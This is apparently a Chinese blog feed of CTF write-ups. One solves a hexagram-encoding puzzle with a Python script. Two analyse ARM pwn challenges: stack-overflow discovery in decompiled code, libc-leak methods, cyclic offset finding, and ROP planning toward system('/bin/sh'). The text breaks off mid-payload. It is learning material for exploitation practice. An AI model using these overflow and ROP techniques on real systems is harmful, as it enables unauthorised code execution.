'101101', '革': '101110', '同人': '101111', '临': '110000', '损': '110001', '节': '110010', '中孚': '110011', '归妹': '110100', '睽': '110101', '兑': '110110', '履': '110111', '泰': '111000', '大畜': '111001', '需': '111010', '小畜': '111011', '大壮': '111100', '大有': '111101', '夬': '111110', '乾': '111111'</code></pre><blockquote><p>写一个python脚本将那个文件中的卦象分别解成二进制，可以发现bit数正好是4039032，可以整除8（8bit为1byte）。到这基本上可以判断思路正确。</p><p>脚本如下:</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> respecial <span class="token operator">=</span> <span class="token triple-quoted-string string">'''乾﹑坤﹑屯﹑蒙﹑需﹑讼﹑师﹑比﹑小畜﹑履﹑泰﹑否﹑同人﹑大有﹑谦﹑豫﹑随﹑蛊﹑临﹑观﹑噬嗑﹑贲﹑剥﹑复﹑无妄﹑大畜﹑颐﹑大过﹑坎﹑离﹑咸﹑恒﹑遁﹑大壮﹑晋﹑明夷﹑家人﹑睽﹑蹇﹑解﹑损﹑益﹑夬﹑姤﹑萃﹑升﹑困﹑井﹑革﹑鼎﹑震﹑艮﹑渐﹑归妹﹑丰﹑旅﹑巽﹑兑﹑涣﹑节﹑中孚﹑小过﹑既济﹑未济'''</span><span class="token comment" spellcheck="true">#二进制顺序的卦象</span>guashu <span class="token operator">=</span> <span class="token triple-quoted-string string">'''坤、剥、比、观、豫、晋、萃、否、谦、艮、蹇、渐、小过、旅、咸、遁、师、蒙、坎、涣、解、未济、困、讼、升、蛊、井、巽、恒、鼎、大过、姤、复、颐、屯、益、震、噬嗑、随、无妄、明夷、贲、既济、家人、丰、离、革、同人、临、损、节、中孚、归妹、睽、兑、履、泰、大畜、需、小畜、大壮、大有、夬、乾'''</span><span class="token keyword">def</span> <span class="token function">Getword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    strings <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    s<span class="token operator">=</span>special<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'﹑'</span><span class="token punctuation">)</span>    s2 <span class="token operator">=</span> guashu<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"、"</span><span class="token punctuation">)</span>    diction <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'G://数据//ctf赛题//中科大ctf//flxg的秘密.txt'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        strings2 <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> strings2<span class="token punctuation">:</span>            strings<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> set<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#因为卦象中存在一个字或者两个字的卦象，jieba分词库不准确，就用/来区别</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        diction<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>strings2<span class="token punctuation">.</span>count<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        strings2 <span class="token operator">=</span> strings2<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">'/'</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> diction<span class="token punctuation">,</span>strings2<span class="token punctuation">,</span>s2<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    diction<span class="token punctuation">,</span>strings2<span class="token punctuation">,</span>s2 <span class="token operator">=</span> Getword<span class="token punctuation">(</span><span class="token punctuation">)</span>    finalbin <span class="token operator">=</span><span class="token string">''</span>    finaldiclist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    dicts<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> diction<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        n<span class="token operator">+=</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">6</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'bits='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>n<span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    finalstrings <span class="token operator">=</span> strings2<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> finalstrings<span class="token punctuation">:</span>        <span class="token keyword">if</span> a <span class="token keyword">in</span> s2<span class="token punctuation">:</span>            finaldiclist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#建立卦象与二进制的关系字典</span>    nice <span class="token operator">=</span><span class="token number">0</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s2<span class="token punctuation">:</span>        dicts<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> format<span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>        n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>dicts<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>finaldiclist<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#按字典解密写入文件</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> finaldiclist<span class="token punctuation">:</span>        finalbin<span class="token operator">+=</span>dicts<span class="token punctuation">[</span>b<span class="token punctuation">]</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'finalbin.txt'</span><span class="token punctuation">,</span><span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> ff<span class="token punctuation">:</span>        ff<span class="token punctuation">.</span>write<span class="token punctuation">(</span>finalbin<span class="token punctuation">)</span></code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc07be42ac0e.png" class="lazyload"></p><blockquote><p>接下来利用python的libnum库，将二进制转换为字符串得到第一个flag：</p></blockquote><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0611d2a07a.png" class="lazyload"></p><blockquote><p>用binwalk分析一下内容，发现里面有一个压缩包，进行提取得到以下文件：一个flag elf程序 ，passkey.txt，简单看一下，接下来的第二题应该是逆向了。。待更新。。。</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc061b548e19.png" class="lazyload"></p></blockquote><p>先到这 。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
            <tag> ustc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10月16-Codegate2018</title>
      <link href="/2018/10/16/Pwn-10%E6%9C%8816-Codegate2018-melong/"/>
      <url>/2018/10/16/Pwn-10%E6%9C%8816-Codegate2018-melong/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Pwn-10月16-Codegate2018-melong"><a href="#Pwn-10月16-Codegate2018-melong" class="headerlink" title="Pwn-10月16-Codegate2018-melong"></a>Pwn-10月16-Codegate2018-melong</h1><blockquote><p>同样借助<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/" target="_blank" rel="noopener">m4x大佬</a>的博客来看一看这一题是一个怎么样的解题思路。</p><p>根据大佬原话<code>漏洞很好找, write_diary 中 read 的长度是由我们输入的, 可以栈溢出, 先进入 PT 函数, 输入 -1, 再进入 write_diary, 就可以实现 arbitrary overflow 了, 因此思路同 x64 下的 rop 相同, 先 leak 出 libc 基址, 然后控制执行 system(“/bin/sh”) 即可</code>，我们来进行分析：</p></blockquote><h2 id="一-查看保护措施"><a href="#一-查看保护措施" class="headerlink" title="一.查看保护措施"></a>一.查看保护措施</h2><blockquote><p>先看一下程序的基本信息咯：</p><p><img src="https://i.loli.net/2018/10/16/5bc55a518786c.png" alt=""></p><p>可以知道这个是个32位arm架构的程序，并且需要动态链接共享库来运行。看一下它的保护措施：</p><p>​    <img src="https://i.loli.net/2018/10/16/5bc55b1e51a4f.png" alt=""></p><p>可以看到并没有开启栈溢出保护，以及nx，pie等保护措施。</p></blockquote><h2 id="二-静态分析程序逻辑"><a href="#二-静态分析程序逻辑" class="headerlink" title="二.静态分析程序逻辑"></a>二.静态分析程序逻辑</h2><blockquote><p>先下载一下缺少的动态共享库：</p><p><code>sudo apt-get install libc6-armel-cross</code></p><p>这样可以解决缺少<code>/lib/ld-linux.so.3</code>的问题，然后简单运行一下看看：</p><p><img src="https://i.loli.net/2018/10/16/5bc5eaee90791.png" alt=""></p><p>可以看到height输入的地方可能存在溢出，接下来ida看一看程序逻辑：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r0</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+0h] [bp-54h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+34h] [bp-20h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+38h] [bp-1Ch]</span>  size_t v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+40h] [bp-14h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+4Ch] [bp-8h]</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to the BPSEC gym\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. Check your bmi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. Exercise"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3. Register personal training"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4. Write daily record"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"5. Have some health menu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"6. Out of the gym\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Type the number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v3 <span class="token operator">=</span> <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v9 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token function">check</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>          <span class="token function">exercise</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          <span class="token function">check_first</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>          v8 <span class="token operator">=</span> <span class="token function">PT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          <span class="token function">check_first</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token punctuation">)</span>          <span class="token function">write_diary</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v8<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you should take personal training first!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token function">diet_menu</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>LABEL_14<span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"See you again :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid number :("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>进入case3的PT函数可以看到一个判断：</p><pre class=" language-c"><code class="language-c">size_t <span class="token function">PT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  size_t v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r3</span>  size_t size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+4h] [bp-10h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+8h] [bp-Ch]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+Ch] [bp-8h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's start personal training"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How long do you want to take personal training?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//ptr 将会申请一个size大小的内存空间，如果我们输入-1给size，那么malloc会申请失败导致ptr为null</span>  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> ptr <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>exc2 <span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//ptr == NULL 判断成立可以进入case4</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Okay, start to exercise!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>size<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you are getting healthy.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    v0 <span class="token operator">=</span> size<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Check your bmi again!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    v0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> v0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>之前记的那个看起来像是突破点的地方其实并不是，真正的溢出点在case4：</p><pre class=" language-c"><code class="language-c">_DWORD <span class="token operator">*</span>__fastcall <span class="token function">write_diary</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>result<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+0h] [bp-14h]</span>  <span class="token keyword">unsigned</span> __int8 nbytes<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+Fh] [bp-5h]</span>  buf <span class="token operator">=</span> a2<span class="token punctuation">;</span>  nbytes <span class="token operator">=</span> <span class="token operator">*</span>result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> nbytes <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//溢出点啦</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you wrote %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>然后呢，从这里就到了开始疯狂的补姿势的时候了。因为这题和上题类似，需要我们找到system函数的地址才行呢，给自己挖了个大坑，以后再来填吧。</p></blockquote><h3 id="system地址泄露-amp-amp-leak-libc"><a href="#system地址泄露-amp-amp-leak-libc" class="headerlink" title="system地址泄露&amp;&amp;leak libc"></a>system地址泄露&amp;&amp;leak libc</h3><p><a href="http://www.freebuf.com/articles/rookie/155971.html" target="_blank" rel="noopener">参考文章1</a></p><p><a href="https://www.cnblogs.com/HacTF/p/8052175.html" target="_blank" rel="noopener">参考文章2</a></p><blockquote><p> 【1】利用格式化字符串漏洞泄露栈中的数据，从而找到libc的某个函数地址，再利用libc-database来判断远程libc的版本，之后再计算出libc的基址。</p><p>【2】利用write这个函数，pwntools有个很好用的函数DynELF去利用这个函数计算出程序的各种地址，包括函数的基地址，libc的基地址，libc中system的地址。</p><p>【3】利用printf函数，printf函数输出的时候遇到0x00时候会停止输出，如果输入的时候没有在最后的字节处填充0x00，那么输出的时候就可能泄露栈中的重要数据，比如libc的某个函数地址。</p></blockquote><blockquote><p><strong>关于PLT（进程链接表）和GOT（Global Offset Table-全局偏移表）</strong>：为了灵活利用虚拟内存空间，所以编译器可以产生位置无关的代码。可执行文件可以是位置无关的，也可以是位置相关的， 动态链接库绝大多数都是位置无关的。 GOT表可写不可执行， PLT可执行不可写。他们相互作用来实现函数符号的延时绑定.。ASLR并不随机化PLT部分，所以对ret2plt攻击没有直接影响。 为防止恶意修改got， 链接器提供了RELRO选项,，去除got的写权限， 但也牺牲了延时绑定带来的好处。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10月15-qemu</title>
      <link href="/2018/10/15/Pwn-10%E6%9C%8815-qemu/"/>
      <url>/2018/10/15/Pwn-10%E6%9C%8815-qemu/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Pwn-10月15-简单了解异构pwn题"><a href="#Pwn-10月15-简单了解异构pwn题" class="headerlink" title="Pwn-10月15-简单了解异构pwn题"></a>Pwn-10月15-简单了解异构pwn题</h1><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 参照m4x大佬的博客简单地搭建了一下环境后，继续来练练手，简单了解一下异构binary调试，如arm，mips，环境搭建参照上一篇。</p><p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt=""></p><p>arm 的参数 1 ~ 4 分别保存到 r0 ~ r3 寄存器中, 剩下的参数从右向左依次入栈, 被调用者实现栈平衡, 返回值存放在 r0 中 。arm 的 pc 指针相当于 eip/rip, b/bl 等指令实现了跳转 </p></blockquote><h2 id="Jarvis-oj-typo"><a href="#Jarvis-oj-typo" class="headerlink" title="Jarvis oj - typo"></a>Jarvis oj - typo</h2><blockquote><p>简单说一下步骤：先查看保护措施，可以发现没有栈溢出保护，运行程序有溢出点可以利用，然后可以找到溢出点位置，找到system函数，以及/bin/sh字符串的位置，然后拿到能够控制 r0寄存器</p></blockquote><h3 id="一-查看保护措施"><a href="#一-查看保护措施" class="headerlink" title="一. 查看保护措施"></a>一. 查看保护措施</h3><blockquote><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#checksec typo</span>    Arch:     arm-32-little    <span class="token comment" spellcheck="true">#32位小端序 arm架构程序</span>    RELRO:    Partial RELRO    Stack:    No canary found    <span class="token comment" spellcheck="true">#无栈溢出保护</span>    NX:       NX enabled            PIE:      No PIE <span class="token punctuation">(</span>0x8000<span class="token punctuation">)</span></code></pre><blockquote><p>顺便学习一下几种防护措施的意思：</p><p> 参考链接：<a href="https://www.jianshu.com/p/6e528b33e37a" target="_blank" rel="noopener">https://www.jianshu.com/p/6e528b33e37a</a></p><p> ​    <strong>RELRO</strong>:在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，尽量减少可写的存储区域可使安全系数提高。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术Relocation Read Only, 重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。</p><p> ​    栈溢出检查，用<strong>Canary金丝雀值</strong>是否变化来检测,Canary found表示开启。金丝雀最早指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。这里是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。</p><p> <strong> NX </strong> : No Execute，栈不可执行，也就是windows上的DEP。 分析缓冲区溢出攻击，其根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP就是用来弥补计算机对数据和代码混淆这一天然缺陷的。 </p><p> <strong>PIE</strong>: position-independent executables, 位置无关的可执行文件，也就是常说的ASLR(Address space layout randomization) 地址随机化，程序每次启动基址都随机。 </p></blockquote></blockquote><h3 id="二-分析程序"><a href="#二-分析程序" class="headerlink" title="二. 分析程序"></a>二. 分析程序</h3><blockquote><p>开始远程调试：</p><p><img src="https://i.loli.net/2018/10/15/5bc4403f1bdbb.png" alt=""></p><p>另一边使用 <code>gdb-multiarch typo -q</code>进入pwndbg，并且使用<code>target remote localhost:6788</code>连接程序：</p><p><img src="https://i.loli.net/2018/10/15/5bc4437a3ebb6.png" alt=""></p><p>生成padding，输入后得到溢出信息</p><pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> cyclic 200aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</code></pre><p><img src="https://i.loli.net/2018/10/15/5bc4443368612.png" alt=""></p></blockquote><h3 id="三-确定溢出点"><a href="#三-确定溢出点" class="headerlink" title="三.确定溢出点"></a>三.确定溢出点</h3><blockquote><p>之前已经说过PC相当于EIP,RIP之类的指向下一条指令的寄存器，那么可以计算padding到PC寄存器的偏移量进而确定溢出点为0x62616165：</p><p>使用pwndbg的<code>cyclic -l</code>命令可以通过地址，字符串确定偏移量.</p><p><img src="https://i.loli.net/2018/10/15/5bc445613c9bc.png" alt=""></p></blockquote><h3 id="四-构造payload进行利用"><a href="#四-构造payload进行利用" class="headerlink" title="四.构造payload进行利用"></a>四.构造payload进行利用</h3><blockquote><p> 默默标记M4x博文中的这句话<code>因为是静态链接, 所以 binary 中一定会有 system 函数 和 /bin/sh 字符串, 如果能找到溢出点, 很容易就能用 rop 来解决了</code>，学习一波姿势，构造<code>rop chain</code>，通过ROPgadget可以找到我们需要的：可以用来传递 返回值的寄存器 r0</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc4465b7fefb.png" class="lazyload"></p><p>那么接下来就是寻找system函数的地址，将其填入PC寄存器的位置，从而执行<code>system(&#39;/bin/sh&#39;)</code></p><p>IDA调试一波：</p><p>通过字符串查找或者交叉引用可以发现函数<code>sub_10BA8</code></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc44948ebb68.png" class="lazyload"></p><p>不知道是不是ida7.0的原因，这里直接找到了system函数：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc44a0873387.png" class="lazyload"></p><p>可以看到其执行命令的逻辑和地址：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc44d1ac5d50.png" class="lazyload"></p><p>接下来可以开始构造payload结构：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">|</span>    padding            <span class="token operator">|</span>    <span 